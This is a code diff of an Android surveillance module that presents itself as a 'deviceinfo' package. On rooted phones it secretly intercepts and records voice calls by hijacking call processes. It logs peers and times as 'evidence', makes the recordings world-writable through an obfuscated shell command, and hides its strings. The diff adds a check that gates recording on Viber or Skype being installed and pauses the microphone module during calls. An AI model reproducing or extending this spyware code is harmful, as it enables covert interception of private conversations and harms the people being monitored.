@@ -23,6 +23,10 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
 
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.content.pm.PackageManager.NameNotFoundException;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.FileObserver;
@@ -45,6 +49,7 @@ import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.listener.ListenerProcess;
 import com.android.deviceinfo.manager.ManagerModule;
+import com.android.deviceinfo.module.ModuleDevice.PInfo;
 import com.android.deviceinfo.module.call.CallInfo;
 import com.android.deviceinfo.module.call.Chunk;
 import com.android.deviceinfo.module.call.EncodingTask;
@@ -102,6 +107,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
 	private boolean recording;
+	private Object recordingLock = new Object();
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
@@ -143,14 +149,21 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		if (Status.haveRoot()) {
-			
-			if(android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 17 ){
+
+			if (android.os.Build.VERSION.SDK_INT < 15 || android.os.Build.VERSION.SDK_INT > 17) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (actualStart): OS level not supported");
 				}
 				return;
 			}
-			
+
+			if (!installedWhitelist()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (actualStart) No whitelist apps installed");
+				}
+				return;
+			}
+
 			AudioEncoder.deleteAudioStorage();
 			boolean audioStorageOk = AudioEncoder.createAudioStorage();
 
@@ -162,8 +175,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				if (installHijack()) {
+					if (ModuleMic.self() != null) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (resume) can't switch on mic because call is on");
+						}
+						ModuleMic.self().stop();
+					}
 					startWatchAudio();
 					recording = true;
+
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -174,25 +194,55 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 	}
 
+	private boolean installedWhitelist() {
+
+		String[] whitelist = new String[] { "com.viber.voip", "com.skype.raider" };
+
+		final ArrayList<PInfo> res = new ArrayList<PInfo>();
+		final PackageManager packageManager = Status.getAppContext().getPackageManager();
+
+		for (String white : whitelist) {
+			try {
+				ApplicationInfo ret = packageManager.getApplicationInfo(white, 0);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installedWhitelist) found " + white);
+				}
+				return true;
+			} catch (NameNotFoundException ex) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (installedWhitelist) not installed: " + white);
+				}
+			}
+
+			String pm = packageManager.getInstallerPackageName(white);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installedWhitelist) " + pm);
+			}
+		}
+
+		return false;
+
+	}
+
 	@Override
 	public void actualStop() {
 		ListenerCall.self().detach(this);
-	
+
 		if (Status.haveRoot()) {
 			if (queueMonitor != null && queueMonitor.isAlive()) {
 				encodingTask.stop();
 			}
-	
+
 			if (observer != null) {
 				observer.stopWatching();
 			}
-	
+
 			if (hijack != null) {
 				hijack.stopInstrumentation();
 				hijack.killProc();
 			}
-			
-			if(ModuleMic.self()!=null){
+
+			if (ModuleMic.self() != null) {
 				ModuleMic.self().resetBlacklist();
 			}
 		}
@@ -253,13 +303,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean installHijack() {
 		// Initialize the callback system
-		
+
 		if (ModuleMic.self() != null) {
 			ModuleMic.self().suspend();
-			//ModuleMic.self().addBlacklist("skype");
-			//ModuleMic.self().addBlacklist("viber");
+			// ModuleMic.self().addBlacklist("skype");
+			// ModuleMic.self().addBlacklist("viber");
 		}
-		
+
 		hjcb = new CallBack();
 		hjcb.register(new HijackCallBack());
 
@@ -280,7 +330,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		return true;
 	}
-	
+
 	private void purgeAudio() {
 		// Scrub for existing files on FS
 		File f = new File(AudioEncoder.getAudioStorage());
@@ -365,7 +415,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Make it read-write in any case
 		Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + s);
 
-
 		// Add the file to the list
 		calls.add(s);
 
@@ -421,9 +470,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	public boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " +
-			" peer: " + peer + " from: " + dateBegin
-			+ " to: " + dateEnd + " incoming: " + incoming);
+			Check.log(TAG + " (saveCallEvidence): " + " peer: " + peer + " from: " + dateBegin + " to: " + dateEnd
+					+ " incoming: " + incoming);
 
 		}
 
@@ -663,7 +711,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						+ "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
 
-
 			heuristic = false;
 
 		}
@@ -807,7 +854,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 	}
-
 
 	private boolean updateCallInfo(CallInfo callInfo, boolean end) {
 
